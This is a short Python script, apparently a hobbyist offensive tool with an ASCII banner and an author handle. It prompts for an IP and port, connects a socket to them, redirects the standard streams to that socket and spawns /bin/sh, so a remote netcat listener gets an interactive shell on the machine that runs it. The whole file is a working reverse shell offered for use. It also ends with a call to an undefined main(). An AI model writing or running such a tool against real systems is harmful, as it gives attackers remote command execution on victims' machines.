#!/usr/bin/python3
#Simple python reverse shell. Set up a netcat listener to recieve connection
import os
import pty
import socket
import sys

#Banner
print("*" * 30)
print("           .-.")
print("          (0.0)")
print("        '=.|m|.='")
print("        .='`\"``=.")
print("    REVERSE SHELL TOOL")
print("    Author: Crashwire")
print("*" * 30)

target_ip = input("\nPlease input the target IP: ")
target_port = input("Please input the target Port: ")

#Create and connect to socket
s = socket.socket()
try:
  s.connect((target_ip, int(target_port)))
  print("Connection established")
except Exception as e:
  print(f"Error connecting to {target_ip}:{target_port} - {e} check firewall and verifiy connectivity")
  sys.exit(1)
#Redirect standard file descriptors to the specified socket
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
#Spawns shell at listener
pty.spawn("/bin/sh")

if __name__ == "__main__":
    main()
